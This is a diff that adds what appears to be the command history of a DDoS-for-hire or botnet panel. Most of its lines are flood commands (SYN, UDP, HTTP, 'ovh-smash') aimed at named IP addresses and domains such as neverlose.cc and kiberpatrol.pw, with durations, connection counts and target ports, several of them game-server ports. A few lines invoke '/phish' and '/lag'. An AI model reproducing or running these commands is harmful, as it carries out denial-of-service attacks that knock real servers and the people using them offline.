@@ -1,0 +1,43 @@
+/methods
+/methods
+/DDoS
+/DDoS msyn  117.27.239.28 60
+/DDoS domain=https://neverlose.cc/ conns=300
+/DDoS domain=neverlose.cc conns=120
+/DDoS http domain=neverlose.cc conns=120
+/DDoS mudpplain 117.27.239.28 60 80
+/DDoS mstd 117.27.239.28 60 80
+/phish
+/plan
+/methods
+/DDoS syn 117.27.239.28 100 80
+/DDoS syn 117.27.239.28 100 dport=80
+/DDoS udp 103.95.221.2 60 dport=80
+/methods
+/DDoS udp 109.237.109.174 550 dport=27016
+/ddos std 195.62.53.87 1100 dport=27063
+/ddos udp 195.62.53.87 500 27063
+/methods
+/ddos syn 195.62.53.87 500 dport=27063
+/ddos stdhex 103.95.221.87 120 dport=80
+/method
+/methods
+/ddos ovh-smash 103.95.221.2 120 80
+/ddos syn 103.95.221.2 120 80
+/blacklist
+/lag
+/ddos syn 103.95.221.2 120 dport=80
+/ddos syn 103.95.221.2 120 80
+/ddos std 159.69.14.154 1100 80
+/methods
+/ddos syn 159.69.14.154 120 dport=80
+/ddos std 95.54.159.72 1100 80
+/methods
+/ddos syn 193.26.217.143 200 dport=27029
+/ddos stdhex 193.26.217.143 200 27029
+/ddos udpplain 193.26.217.143 200 27029
+/ddos ovh-smash 193.26.217.143 120 27029
+/methods
+/ddos http 91.240.21.3 560
+/ddos domain=kiberpatrol.pw conns=5000
+/ddos http domain=kiberpatrol.pw conns=5000
